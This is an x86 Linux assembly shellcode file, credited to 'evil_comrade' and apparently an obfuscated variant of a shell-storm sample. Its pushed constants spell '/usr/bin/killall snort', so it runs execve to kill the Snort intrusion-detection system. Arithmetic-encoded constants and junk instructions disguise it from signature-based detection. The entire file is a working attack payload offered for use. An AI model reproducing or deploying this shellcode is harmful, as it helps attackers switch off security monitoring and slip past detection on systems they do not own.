;Shellcode obfuscation
;original link http://shell-storm.org/shellcode/files/shellcode-741.php
;Author: evil_comrade
;
global _start
section .text
_start:

	xor ebx,ebx			;Clear ebx register
	imul ebx			;Clear all other registers

	mov ebx, eax
	mov dword [esp-4], ebx
	sub esp, 4
	test eax, eax
		
	push 0x74
	mov edx, 0x615E5D62	
	add edx, 0x11111111	
	push edx			;push 0x726f6e73
	mov esi, esp
	
	push eax
	push dword 0x6c6c616c
	test eax, eax	
	push dword 0x6c696b2f
	test ebx, ebx	
	push dword 0x6e69622f
	push dword 0x7273752f
	mov ebx,esp
	
	push eax
	push esi
	push ebx
	mov ecx, esp
	
	cdq
	
	mov al, 0xa
	inc eax
	int 0x80
	
